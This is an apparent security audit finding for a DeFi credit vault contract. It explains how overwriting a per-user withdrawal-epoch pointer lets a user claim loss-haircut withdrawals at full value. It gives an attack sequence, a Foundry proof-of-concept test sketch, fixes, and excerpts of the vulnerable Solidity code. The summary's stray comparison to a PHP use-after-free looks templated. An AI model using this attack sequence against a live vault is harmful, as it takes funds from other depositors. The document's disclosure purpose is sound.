### Title
Loss-adjusted withdraw receipts can be claimed at par by re-requesting in a later epoch — `lastWithdrawRequest` overwrites the loss-epoch key - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
The analog to the PHP use-after-free (a destroyed/stale record being dereferenced through the wrong key) lives in the credit vault's loss-adjusted claim path. When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` stores a haircut in `lossRecoveryPriceByEpoch[epochNumber]` and zeroes the global `pendingWithdraws`, but each user's claim basis stays in `withdrawsRequestsByEpoch[user][epoch]`. The claim path locates that basis **only** through `lastWithdrawRequest[user]`, which `requestWithdraw` overwrites on every new request. A user who re-requests before claiming causes the haircutted epoch-N record to be dereferenced under epoch-M's key, falls through to `_claimFundedWithdrawRequest`, and is paid the loss-adjusted basis at par — draining underlyings that were funded assuming the haircut.

### Finding Description
- `requestWithdraw` records `withdrawsRequests[_user] += _amount`, `withdrawsRequestsByEpoch[_user][currentEpoch] += _amount`, and sets `lastWithdrawRequest[_user] = currentEpoch`, minting a 1:1 strategy-token receipt. [1](#0-0) 
- On a `stopEpochWithDuration` partial fund, `collectWithdrawFunds` sets `lossRecoveryPriceByEpoch[epochNumber] = price` and clears `pendingWithdraws`; the per-user, per-epoch basis remains for lazy claiming. [2](#0-1) 
- `_claimLossAdjustedWithdrawRequest` computes `lossEpoch = lastWithdrawRequest[_user]` and looks up `lossRecoveryPriceByEpoch[lossEpoch]`. If the user has since made a newer request, `lossEpoch` is the *new* epoch, the lookup returns 0, and the function returns without clearing epoch N. [3](#0-2) 
- `claimWithdrawRequest` then calls `_claimFundedWithdrawRequest`, which pays the entire aggregate `withdrawsRequests[_user]` (still containing the un-cleared epoch-N basis) at par and burns the matching receipt tokens. [4](#0-3) [5](#0-4) 
- `_clearWithdrawClaimForEpoch` only ever clears `withdrawsRequestsByEpoch[_user][_claimEpoch]` for the epoch passed in; there is no path that iterates older epochs, so the epoch-N basis is never re-keyed to its haircut. [6](#0-5) 

Attack sequence (standard epoch mode):
1. Epoch N buffer: attacker calls `cdoEpoch.requestWithdraw(x)`; `lastWithdrawRequest = N`.
2. Epoch N running; borrower repays only part of `pendingWithdraws` → `collectWithdrawFunds` stores `lossRecoveryPriceByEpoch[N] < 1e18`, `pendingWithdraws = 0`.
3. Epoch N+1 buffer: attacker calls `requestWithdraw` again (any small amount) → `lastWithdrawRequest = N+1`.
4. After epoch N+1 ends (`epochNumber > N+1`), attacker calls `claimWithdrawRequest`: the loss path no-ops (`lossRecoveryPriceByEpoch[N+1] == 0`), and `_claimFundedWithdrawRequest` pays `withdrawsRequests[attacker]` — including the epoch-N amount — at par.

The only guard on `_claimFundedWithdrawRequest` is the one-epoch wait (`epochNumber <= lastWithdrawRequest[_user]` reverts), which the attacker satisfies trivially; nothing re-checks whether an older basis belongs to a loss epoch.

### Impact Explanation
The strategy was funded with `pendingBasis * lossRecoveryPrice / RECOVERY_FULL` for epoch-N receipts. The attacker withdraws `x` at par instead of `x * lossRecoveryPrice`, extracting `x * (RECOVERY_FULL - lossRecoveryPrice) / RECOVERY_FULL` extra underlyings. Since `pendingWithdraws` was zeroed and remaining funded balance is sized to cover haircutted claims plus other users' funded receipts, this is direct theft from other claimants/LPs — it breaks the loss-waterfall invariant (pending receipts are supposed to share the realized loss pro rata, per `previewLossAdjustedWithdrawFunds`) and can leave the strategy under-reserved/insolvent for later claimers. The gain scales with the attacker's share of the default-epoch pending bucket and the loss severity.

### Likelihood Explanation
Requirements are all achievable by an unprivileged tranche holder: a partial `stopEpochWithDuration` loss (realized credit loss, a normal protocol event), holding a withdraw receipt in that epoch, and making a second request in any later epoch. No privileged collusion, timing race, or KYC bypass is needed beyond what any allowed lender can do. The one-epoch claim delay is the only cost. The bug is deterministic once the loss epoch exists, so likelihood is moderate-to-high in any pool that experiences a realized loss while withdraw requests are pending.

### Recommendation
Do not key the loss-adjusted lookup solely on `lastWithdrawRequest`. Options:
- In `_claimFundedWithdrawRequest`, before paying at par, iterate/verify the user's `withdrawsRequestsByEpoch` entries against `lossRecoveryPriceByEpoch` and route any epoch with a non-zero price through `_claimLossAdjustedWithdrawRequest`; or
- Track per-user a separate "loss epoch" pointer (e.g., `lossWithdrawRequestEpoch[_user]`) set when a receipt lands in an epoch that later gets a `lossRecoveryPriceByEpoch` entry, independent of `lastWithdrawRequest`; or
- Prohibit `requestWithdraw` while the user has an uncleared receipt in a loss-adjusted epoch, or force-claim the haircutted amount inside `requestWithdraw` before overwriting `lastWithdrawRequest`.

### Proof of Concept
Foundry fork test sketch against `IdleCreditVault`/`IdleCDOEpochVariant` (standard epoch variant):

```solidity
function testLossAdjustedReceiptClaimedAtPar() external {
    // epoch N buffer: attacker deposits and requests withdraw of X
    uint256 shares = _depositWithUser(attacker, 100_000e6);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(shares, address(AAtranche));
    uint256 reqBasis = strategy.withdrawsRequests(attacker);

    vm.prank(manager);
    cdoEpoch.startEpoch();

    // borrower repays only half of pendingWithdraws -> loss epoch N
    uint256 pending = strategy.pendingWithdraws();
    deal(defaultUnderlying, borrower, pending / 2 + strategyInterest);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(epochDuration, interest, lossAmount); // triggers collectWithdrawFunds(pending/2)
    assertGt(strategy.lossRecoveryPriceByEpoch(strategy.epochNumber()), 0);
    uint256 lossEpoch = strategy.epochNumber(); // == N

    // epoch N+1 buffer: attacker makes a second request, overwriting lastWithdrawRequest
    _depositWithUser(attacker, 1_000e6);
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(1, address(AAtranche));
    assertEq(strategy.lastWithdrawRequest(attacker), lossEpoch + 1);

    vm.prank(manager);
    cdoEpoch.startEpoch();
    // fund epoch N+1 fully
    deal(defaultUnderlying, borrower, neededFunds);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // attacker claims: loss path no-ops (price keyed on N+1), funded path pays ALL at par
    uint256 balBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balBefore;

    uint256 fairPrice = strategy.lossRecoveryPriceByEpoch(lossEpoch);
    uint256 fair = reqBasis * fairPrice / 1e18 + 1;
    assertGt(paid, fair); // attacker escaped the epoch-N haircut
}
```

Caveat: exact `stopEpochWithDuration` parameterization and helper names should be matched to `IdleCDOEpochVariant`'s signature in the test harness; the accounting flaw itself is in `IdleCreditVault.sol` and is independent of those details.

  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);

  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);

  function _clearWithdrawClaimForEpoch(address _user, uint256 _claimEpoch, bool _isClearingApr0) internal returns (uint256 claimBasis, uint256 burnAmount) {
    (claimBasis, burnAmount) = _withdrawClaimAmountsForEpoch(_user, _claimEpoch);
    if (claimBasis == 0) return (claimBasis, burnAmount);

    uint256 normalAmount = withdrawsRequestsByEpoch[_user][_claimEpoch];
    if (normalAmount != 0) {
      withdrawsRequestsByEpoch[_user][_claimEpoch] = 0;
      // The aggregate may also include older funded receipts; clear only this epoch's piece.
      withdrawsRequests[_user] -= normalAmount;
    }
    Apr0UserData storage apr0User = apr0Users[_user];
    if (apr0User.principal != 0 && apr0User.principalEpoch == _claimEpoch) {
      if (_isClearingApr0) {
        uint256 apr0Principal = apr0User.principal;
        uint256 totalApr0Principal = apr0TotalPrincipal;
        // prepareStopEpochWithApr0 may already close the global APR0 bucket before default finalization.
        apr0TotalPrincipal = apr0Principal >= totalApr0Principal ? 0 : totalApr0Principal - apr0Principal;
      }
      apr0User.principal = 0;
      apr0User.principalEpoch = 0;
    }
    if (lastWithdrawRequest[_user] == _claimEpoch) {
      // The cleared epoch was the latest request marker. Any remaining normal/APR0 receipt
      // is older and already funded, so it can continue to the funded-claim path.
      lastWithdrawRequest[_user] = 0;
    }
  }
